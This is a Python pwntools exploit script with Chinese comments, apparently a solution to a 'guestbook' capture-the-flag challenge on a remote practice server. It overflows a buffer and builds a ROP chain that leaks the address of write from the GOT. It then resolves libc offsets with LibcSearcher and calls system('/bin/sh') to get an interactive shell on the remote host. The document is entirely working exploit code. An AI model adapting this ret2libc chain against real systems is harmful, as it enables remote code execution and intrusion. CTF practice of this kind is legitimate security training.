from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = "debug"

io = remote('node4.buuoj.cn', 26781)

e = ELF('./guestbook')


'''
x64 寄存器传参顺序：
rdi rsi rdx rcx r8 r9
'''

write_plt = e.plt["write"]
write_got = e.got["write"]
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4006ea
mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = 0x4006d0

pop_rdi_ret = 0x4006f3
pop_rsi_r15_ret = 0x4006f1
main_addr = 0x4004e0

good_game = 0x400620

addr = 0x4006f2



# 方法1
# payload1 = b'a'*0x88 + p64(good_game)

# 方法2
# 因为上一次调用write函数的第三个参数为0x29，比8要大，所以我们可以不用去控制第三个参数的寄存器rdx，就让他输出0x29个字节，只读取前8个即可
payload1 = b'a'*0x88+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(1)
payload1 += p64(write_plt) + p64(main_addr)


io.recvuntil(b'message:\n')
io.sendline(payload1)
io.recvuntil(b'you!\n')

# write_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
write_addr = u64(io.recv(8))
io.success(hex(write_addr))

libc = LibcSearcher("write", write_addr)
offset = write_addr - libc.dump("write")

system_Addr = libc.dump("system") + offset
binSh_Addr  = libc.dump("str_bin_sh") + offset

payload2 = b'a'*0x88+p64(pop_rdi_ret)+p64(binSh_Addr)+p64(system_Addr)
# write_addr = u64(io.recv(8))
# io.success(hex(write_addr))
io.sendline(payload2)

io.interactive()
